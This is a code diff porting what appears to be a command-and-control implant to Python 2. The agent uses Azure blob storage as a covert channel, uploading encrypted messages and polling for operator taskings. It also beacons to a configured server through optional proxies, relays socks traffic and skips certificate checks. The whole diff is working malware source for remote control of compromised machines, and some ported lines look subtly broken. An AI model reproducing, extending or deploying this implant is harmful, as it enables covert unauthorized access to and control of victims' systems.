@@ -1,8 +1,8 @@
 import os, random, sys, json, socket, base64, time, platform, ssl, getpass
-import urllib.request
+import threading, urllib2
 import uuid
 from datetime import datetime
-import threading, queue
+from Queue import Queue
 
 CHUNK_SIZE = 51200
 
@@ -24,74 +24,91 @@ CRYPTO_HERE
     sas_token = "CONTAINER_SAS_PLACEHOLDER"
 #CERTSKIP
 
-    def get_blob_url(self, blob_path: str) -> str:
+    def get_blob_url(self, blob_path):
         """Construct full blob URL with SAS token"""
-        return f"{self.blob_endpoint}/{self.container_name}/{blob_path}?{self.sas_token}"
+        return "{}/{}/{}?{}".format(self.blob_endpoint, self.container_name, blob_path, self.sas_token)
 
-    def put_blob(self, blob_path: str, data: bytes) -> bool:
+    def put_blob(self, blob_path, data):
         """Upload data to a blob"""
         url = self.get_blob_url(blob_path)
+        #print("[*] PUT blob to URL: {}".format(url))
         try:
-            req = urllib.request.Request(
-                url,
-                data=data,
-                method="PUT",
-                headers={
-                    "x-ms-blob-type": "BlockBlob",
-                    "Content-Type": "application/octet-stream",
-                    "Content-Length": str(len(data)),
-                }
-            )
-            with urllib.request.urlopen(req) as resp:
-                return resp.status in (200, 201)
+            req = urllib2.Request(url, data=data)
+            req.get_method = lambda: "PUT"
+
+            # Add headers one by one
+            req.add_header("x-ms-blob-type", "BlockBlob")
+            req.add_header("Content-Type", "application/octet-stream")
+            req.add_header("Content-Length", str(len(data)))
+            
+            resp = urllib2.urlopen(req, context=self.gcontext, timeout=30)
+            #print("[*] PUT blob response code: {}".format(resp.getcode()))
+            return resp.getcode() in (200, 201)
+        except urllib2.HTTPError as e:
+            #print("[!] HTTP Error {}: {}".format(e.code, e.read()))
+            return False
         except Exception as e:
-            #print(f"[!] PUT blob error: {e}")
+            #print("[!] PUT blob error: {}".format(e))
             return False
 
-    def delete_blob(self, blob_path: str) -> bool:
+    def delete_blob(self, blob_path):
         """delete a data blob"""
         url = self.get_blob_url(blob_path)
         try:
-            req = urllib.request.Request(
-                url,
-                method="DELETE",
-                headers={
-                    "x-ms-blob-type": "BlockBlob",
-                    "Content-Type": "application/octet-stream",
-                }
-            )
-            with urllib.request.urlopen(req) as resp:
-                return resp.status in (200, 201)
+            req = urllib2.Request(url)
+            req.get_method = lambda: "DELETE"
+
+            req.add_header("x-ms-blob-type", "BlockBlob")
+            req.add_header("Content-Type", "application/octet-stream")
+
+            try:
+                resp = urllib2.urlopen(req, context=self.gcontext, timeout=30)
+            except TypeError:
+                # Older Python 2.7 builds don't support 'context='
+                resp = urllib2.urlopen(req, timeout=30)
+
+            try:
+                # Py2 response object has no .status
+                return resp.getcode() in (200, 201, 202, 204)
+            finally:
+                try:
+                    resp.close()
+                except Exception:
+                    pass
+
         except Exception as e:
-            #print(f"[!] DELETE blob error: {e}")
+            #print("[!] DELETE blob error: {}".format(e))
             return False
 
-    def get_blob(self, blob_path: str) -> bytes:
+    def get_blob(self, blob_path):
         """Download blob data"""
         url = self.get_blob_url(blob_path)
         try:
-            req = urllib.request.Request(url, method="GET")
-            with urllib.request.urlopen(req) as resp:
+            req = urllib2.Request(url)
+            resp = urllib2.urlopen(req, context=self.gcontext, timeout=30)
+            try:
                 return resp.read()
-        except urllib.request.HTTPError as e:
+            finally:
+                resp.close()
+        except urllib2.HTTPError as e:
             if e.code == 404:
                 return b""  # Blob not found
-            #print(f"[!] GET blob error: {e}")
+            #print("[!] GET blob error: {}".format(e))
             return b""
         except Exception as e:
-            #print(f"[!] GET blob error: {e}")
+            #print("[!] GET blob error: {}".format(e))
             return b""
 
     def postMessageAndRetrieveResponseBlob(self, data):
         formatted_data = self.formatMessage(data)
         message_id = uuid.uuid4()
-        self.put_blob(f"ats/{message_id}.blob", formatted_data)
+        self.put_blob("ats/{}.blob".format(message_id), formatted_data)
         response = b""
         while response == b"":
             self.agentSleep()
-            response = self.get_blob(f"sta/{message_id}.blob")
-            #print(f"[*] checking for sta/{message_id}.blob: {response}")
-        self.delete_blob(f"sta/{message_id}.blob")
+            response = self.get_blob("sta/{}.blob".format(message_id))
+            #print("[*] checking for sta/{}.blob: {}".format(message_id, response))
+        self.delete_blob("sta/{}.blob".format(message_id))
         decoded_response = base64.b64decode(response)
         return self.formatResponse(self.decrypt(decoded_response))
 
@@ -119,9 +136,11 @@ CRYPTO_HERE
 
     def postMessageAndRetrieveResponse(self, data):
         return self.postMessageAndRetrieveResponseBlob(data)
+        #return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))
 
     def getMessageAndRetrieveResponse(self, data):
         return self.postMessageAndRetrieveResponseBlob(data)
+        #return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
 
     def sendTaskOutputUpdate(self, task_id, output):
         responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
@@ -129,32 +148,6 @@ CRYPTO_HERE
         response_data = self.postMessageAndRetrieveResponse(message)
         if "socks" in response_data:
             for packet in response_data["socks"]: self.socks_in.put(packet)
-
-    def postResponses(self):
-        try:
-            responses = []
-            socks = []
-            taskings = self.taskings
-            for task in taskings:
-                if task["completed"] == True:
-                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
-                    if task["error"]: out["status"] = "error"
-                    for func in ["processes", "file_browser"]:
-                        if func in task: out[func] = task[func]
-                    responses.append(out)
-            while not self.socks_out.empty(): socks.append(self.socks_out.get())
-            if ((len(responses) > 0) or (len(socks) > 0)):
-                message = { "action": "post_response", "responses": responses }
-                if socks: message["socks"] = socks
-                response_data = self.postMessageAndRetrieveResponse(message)
-                for resp in response_data["responses"]:
-                    task_index = [t for t in self.taskings \
-                                  if resp["task_id"] == t["task_id"] \
-                                  and resp["status"] == "success"][0]
-                    self.taskings.pop(self.taskings.index(task_index))
-                if "socks" in response_data:
-                    for packet in response_data["socks"]: self.socks_in.put(packet)
-        except: pass
 
     def processTask(self, task):
         try:
@@ -243,28 +236,28 @@ CRYPTO_HERE
         for header in self.agent_config["Headers"]:
             hdrs[header] = self.agent_config["Headers"][header]
         if method == 'GET':
-            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
+            req = urllib2.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
         else:
-            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
+            req = urllib2.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
 
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
-            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
+            handler = urllib2.HTTPSHandler if tls else urllib2.HTTPHandler
             if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                proxy = urllib.request.ProxyHandler({
+                proxy = urllib2.ProxyHandler({
                     "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                                                                 self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                 })
-                auth = urllib.request.HTTPBasicAuthHandler()
-                opener = urllib.request.build_opener(proxy, auth, handler)
+                auth = urllib2.HTTPBasicAuthHandler()
+                opener = urllib2.build_opener(proxy, auth, handler)
             else:
-                proxy = urllib.request.ProxyHandler({
+                proxy = urllib2.ProxyHandler({
                     "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                 })
-                opener = urllib.request.build_opener(proxy, handler)
-            urllib.request.install_opener(opener)
+                opener = urllib2.build_opener(proxy, handler)
+            urllib2.install_opener(opener)
         try:
-            with urllib.request.urlopen(req) as response:
+            with urllib2.urlopen(req, context=self.gcontext, timeout=30) as response:
                 out = base64.b64decode(response.read())
                 response.close()
                 return out
